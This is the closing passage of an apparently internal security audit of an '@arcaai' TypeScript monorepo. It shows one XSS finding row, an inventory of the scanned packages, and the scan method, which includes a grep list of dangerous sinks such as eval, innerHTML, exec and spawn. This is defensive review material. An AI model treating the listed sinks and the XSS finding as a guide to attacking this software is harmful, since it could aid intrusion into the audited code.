| MED-06 | ANSI-to-React XSS | Low | Version audit + pre-strip dangerous sequences |

---

## Appendix A: Files Scanned

### `@arcaai/ui` (~1,224 files)

Core components, 16 component registries, hooks, utilities, stories, and tests across:
- `src/components/shadcn/` (40 components)
- `src/components/registries/magicui/` (30 components)
- `src/components/registries/tool-ui/` (80 components)
- `src/components/registries/kibo-ui/` (20 components)
- `src/components/registries/diceui/` (15 components)
- `src/components/registries/prompt-kit/` (15 components)
- `src/components/registries/billingsdk/` (10 components)
- `src/components/registries/manifest/` (15 components)
- `src/components/registries/ai-elements/` (10 components)
- `src/components/registries/shadcn-editor/` (5 components)
- `src/components/registries/mapcn/` (5 components)
- `src/components/elevenlabs/` (10 components)
- `src/components/custom/` (15 components)

### `@arcaai/utils` (16 files)

`date.ts`, `format.ts`, `string.ts`, `validation.ts`, `model-registry.ts`, `model-urls.ts`, `ModelDownloader.ts`, `ModelLoader.ts`, `ModelManagementService.ts`, `ModelSourceManager.ts`, `transformers-cache.ts`, + 4 test files

### `@arcaai/logger` (1 source file)

`src/index.ts` (245 lines)

### `@arcaai/med-ner` (9 source files)

`MedNERProcessor.ts`, `entityUtils.ts`, `browserSupport.ts`, types, hooks, barrel exports

### `@arcaai/pipeline` (7 source files)

`PipelineStage.ts`, `SequentialPipeline.ts`, `ParallelPipeline.ts`, `PipelineOrchestrator.ts`, types, barrel exports

### `@arcaai/tools` (69 files)

CLI generators, prisma commander, API key generator, dev token generator, utility functions, Handlebars templates

---

## Appendix B: Scan Methodology

1. **Dependency CVEs**: Manual version audit against NVD, GitHub Security Advisories, and npm audit databases
2. **Pattern Matching**: Exhaustive grep for dangerous patterns (`eval`, `innerHTML`, `dangerouslySetInnerHTML`, `exec`, `spawn`, `Function`, `document.write`, `__proto__`, `constructor.prototype`, `Math.random`, `JSON.parse`, `fetch`, `import()`)
3. **Regex Analysis**: Every regex pattern extracted and analyzed for nested quantifiers, overlapping character classes, and unbounded input
4. **Data Flow Tracing**: Traced user-controllable inputs through function call chains to identify where unsanitized data reaches dangerous sinks
5. **Configuration Review**: Examined all logger, transport, model loading, and CLI configurations for injection points
6. **File System Audit**: Identified all `fs` operations and checked for symlink following, path traversal, and boundary validation
